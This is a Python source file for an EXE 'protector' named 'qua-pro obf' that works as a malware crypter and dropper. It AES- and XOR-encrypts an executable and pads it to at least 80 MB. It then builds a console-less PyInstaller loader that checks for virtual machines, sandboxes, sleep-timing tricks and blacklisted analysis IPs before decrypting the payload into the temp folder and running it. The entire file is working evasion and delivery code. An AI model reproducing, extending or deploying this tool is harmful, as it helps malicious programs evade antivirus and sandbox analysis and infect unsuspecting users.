import os
import sys
import random
import string
import subprocess
import tempfile
import hashlib
import base64
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import socket
import uuid
import platform
from datetime import datetime
import time
import threading

#################################################
# ------------ SETTINGS --------------------------
#################################################
APP_TITLE = "qua-pro obf"
VERSION = "4.0"
BLACKLISTED_IPS = [
    "20.99.160.173", "35.233.148.249", "84.57.160.9",
    "140.228.21.191", "102.129.152.199", "75.144.26.168",
    "84.147.49.34", "34.9.139.99"
]

#################################################
# ------------  -------------
#################################################
def strong_xor(data: bytes, key: bytes) -> bytes:
    result = bytearray()
    key_len = len(key)
    for i in range(len(data)):
        val = data[i]
        val ^= key[i % key_len]
        val = ((val << 3) & 0xFF) | (val >> 5)  # Rotate left 3
        val ^= 0x5A
        result.append(val)
    return bytes(result)

def strong_xor_decrypt(data: bytes, key: bytes) -> bytes:
    res = bytearray()
    key_len = len(key)
    for i in range(len(data)):
        val = data[i]
        val ^= 0x5A
        val = ((val >> 3) | (val << 5)) & 0xFF
        val ^= key[i % key_len]
        res.append(val)
    return bytes(res)

def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len]) * pad_len
    return cipher.encrypt(data)

def aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dec = cipher.decrypt(data)
    pad_len = dec[-1]
    return dec[:-pad_len]

def generate_key(length=32):
    return get_random_bytes(length)

#################################################
# ------------  --------------------------
#################################################
def pad_data(data: bytes, target_size: int) -> bytes:
    if len(data) >= target_size:
        return data
    return data + os.urandom(target_size - len(data))

#################################################
# ------------  -----------------------------
#################################################
def get_timestamp_hash():
    now = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    return hashlib.sha256(now.encode()).hexdigest()

#################################################
# ------------  --------------
#################################################
def advanced_anti_vm_code():
    return r'''
import sys, os, subprocess, platform, time, uuid, socket, threading, tkinter as tk

def check_processes():
    processes = ["vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "vmsrvc", "vmusrvc", "sandbox"]
    try:
        output = subprocess.check_output("tasklist", shell=True, text=True)
        for proc in processes:
            if proc in output.lower():
                return True
    except: pass
    return False

def check_drivers():
    drivers = ["VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "vmhgfs.sys"]
    sys32 = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "drivers")
    for d in drivers:
        if os.path.exists(os.path.join(sys32, d)):
            return True
    return False

def check_mac():
    vm_macs = ["00:05:69","00:0C:29","00:1C:14","00:50:56","08:00:27"]
    mac = uuid.getnode()
    mac_str = ':'.join(['%02x' % ((mac >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    for p in vm_macs:
        if mac_str.lower().startswith(p.lower()):
            return True
    return False

def check_cpu():
    try:
        if platform.system() != "Windows": return False
        out = subprocess.check_output("wmic cpu get name", shell=True, text=True)
        if "vmware" in out.lower() or "virtualbox" in out.lower():
            return True
    except: return False
    return False

def check_ip_blacklist():
    blacklisted = {''' + ",".join([f'"{ip}"' for ip in BLACKLISTED_IPS]) + r'''}
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip in blacklisted:
            return True
    except: pass
    return False

def check_timing():
    start = time.time()
    time.sleep(2)
    if time.time() - start < 1.8:
        return True
    return False

def show_counter_window():
    root = tk.Tk()
    root.title("Suspicious Environment Detected!")
    root.geometry("350x180")
    count = tk.IntVar(value=0)

    def increment():
        count.set(count.get() + 1)

    tk.Label(root, text="Possible VM detected!", font=("Arial", 14)).pack(pady=10)
    tk.Label(root, textvariable=count, font=("Arial", 18)).pack(pady=10)
    tk.Button(root, text="Click Me", command=increment).pack(pady=10)

    def auto_close():
        time.sleep(120)
        try:
            root.quit()
            root.destroy()
        except: pass

    threading.Thread(target=auto_close, daemon=True).start()
    root.mainloop()

def main_vm():
    if check_processes() or check_drivers() or check_mac() or check_cpu() or check_ip_blacklist() or check_timing():
        show_counter_window()
        sys.exit(0)
'''

#################################################
# ------------ 000 ----------------
#################################################
def create_loader_code(enc_data: bytes, xor_key: bytes, aes_key: bytes, iv: bytes, anti_vm_code: str):
    enc_hex = enc_data.hex()
    xor_key_hex = xor_key.hex()
    aes_key_hex = aes_key.hex()
    iv_hex = iv.hex()
    timestamp_hash = get_timestamp_hash()

    return f'''
{anti_vm_code}

import sys, tempfile, os
from Crypto.Cipher import AES

def rotate_right(val, r_bits, max_bits=8):
    return ((val & (2**max_bits-1)) >> r_bits%max_bits) | (val << (max_bits - (r_bits%max_bits)) & (2**max_bits-1))

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    res = bytearray()
    key_len = len(key)
    for i in range(len(data)):
        val = data[i]
        val ^= 0x5A
        val = rotate_right(val, 3)
        val ^= key[i % key_len]
        res.append(val)
    return bytes(res)

def aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dec = cipher.decrypt(data)
    pad_len = dec[-1]
    return dec[:-pad_len]

def main():
    try:
        main_vm()
    except: pass

    enc_bytes = bytes.fromhex("{enc_hex}")
    xor_key = bytes.fromhex("{xor_key_hex}")
    aes_key = bytes.fromhex("{aes_key_hex}")
    iv = bytes.fromhex("{iv_hex}")

    xor_dec = xor_decrypt(enc_bytes, xor_key)
    data = aes_decrypt(xor_dec, aes_key, iv)

    temp_dir = tempfile.gettempdir()
    exe_path = os.path.join(temp_dir, "payload_{timestamp_hash[:8]}.exe")
    with open(exe_path, "wb") as f:
        f.write(data)

    try:
        os.startfile(exe_path)
    except:
        pass

if __name__ == "__main__":
    main()
'''

#################################################
# ------------ PROTECT EXE ----------------------
#################################################
def protect_exe(input_path, output_dir, target_size):
    print("[+] Starting protection...")

    with open(input_path, "rb") as f:
        original_data = f.read()

    aes_key = generate_key(32)
    iv = generate_key(16)
    xor_key = generate_key(32)

    aes_encrypted = aes_encrypt(original_data, aes_key, iv)
    final_encrypted = strong_xor(aes_encrypted, xor_key)
    full_data = pad_data(final_encrypted, target_size)

    anti_vm_code = advanced_anti_vm_code()
    loader_code = create_loader_code(full_data, xor_key, aes_key, iv, anti_vm_code)

    temp_dir = os.path.join(tempfile.gettempdir(), "exe_protect_temp_v4")
    os.makedirs(temp_dir, exist_ok=True)

    loader_path = os.path.join(temp_dir, "loader.py")
    with open(loader_path, "w", encoding="utf-8") as f:
        f.write(loader_code)

    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--strip",
        f"--distpath={output_dir}",
        loader_path
    ]

    subprocess.run(pyinstaller_cmd, check=True)
    print("[+] EXE successfully created!")

#################################################
# ------------ qua ------------------------------
#################################################
def select_input_file():
    root = tk.Tk()
    root.withdraw()
    return filedialog.askopenfilename(title="Select EXE File", filetypes=[("Executable Files", "*.exe")])

def select_output_folder():
    root = tk.Tk()
    root.withdraw()
    return filedialog.askdirectory(title="Select Output Folder")

def main():
    print("[*] Select EXE file.")
    input_path = select_input_file()
    if not input_path:
        print("[-] No file selected.")
        return

    print("[*] Select output folder.")
    output_dir = select_output_folder()
    if not output_dir:
        print("[-] No folder selected.")
        return

    min_size_mb = max(80, int(os.path.getsize(input_path) / (1024*1024)) + 1)
    root = tk.Tk()
    root.withdraw()
    size_input = simpledialog.askinteger("Size", f"Minimum size: {min_size_mb} MB. Enter target size (MB):", initialvalue=min_size_mb)
    if not size_input or size_input < min_size_mb:
        size_input = min_size_mb

    target_size = size_input * 1024 * 1024
    protect_exe(input_path, output_dir, target_size)
    messagebox.showinfo("Success", "EXE successfully!")

if __name__ == "__main__":
    main()
